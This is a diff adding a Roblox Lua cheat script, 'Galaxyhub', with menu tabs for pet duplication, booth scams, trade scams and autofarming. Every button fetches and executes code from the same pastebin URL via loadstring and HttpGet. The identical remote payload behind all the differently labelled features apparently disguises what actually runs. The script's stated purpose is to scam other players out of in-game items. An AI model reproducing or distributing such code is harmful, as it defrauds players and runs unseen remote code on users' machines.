@@ -1,1 +1,36 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Galaxyhub", "Ocean")
 
+-- Tabs
+local Tab1 = Window:NewTab("dupe")
+local Tab2 = Window:NewTab("boothscam")
+local Tab3 = Window:NewTab("autofarm")
+local Tab4 = Window:NewTab("trade scam")
+local Tab5 = Window:NewTab("Owner")
+
+-- Sections Inside Tabs
+local Tab1Section = Tab1:NewSection("dupe the pet")
+local Tab2Section = Tab2:NewSection("boothscam")
+local Tab3Section = Tab3:NewSection("autofarm")
+local Tab4Section = Tab4:NewSection("trade scam")
+local Tab5Section = Tab5:NewSection("galaxy_boy14t#9259")
+
+-- Buttons
+Tab1Section:NewButton("dupe pet", "this dupe is make your pet hc but wait 1 hour!", function()
+    loadstring(game:HttpGet(("https://pastebin.com/raw/qhsmEwHn"), true))()
+end)
+-- Tab4
+Tab4Section:NewButton("trade scam script", "gui trade scam", function()
+    loadstring(game:HttpGet(("https://pastebin.com/raw/qhsmEwHn"), true))()
+end)
+-- lets fix
+
+Tab2Section:NewButton("boothscam", "press the any exclusive or huge", function()
+    loadstring(game:HttpGet(("https://pastebin.com/raw/qhsmEwHn"), true))()
+end)
+
+-- Tab3
+
+Tab3Section:NewButton("autofarm", "coin farm!", function()
+    loadstring(game:HttpGet(("https://pastebin.com/raw/qhsmEwHn"), true))()
+end)
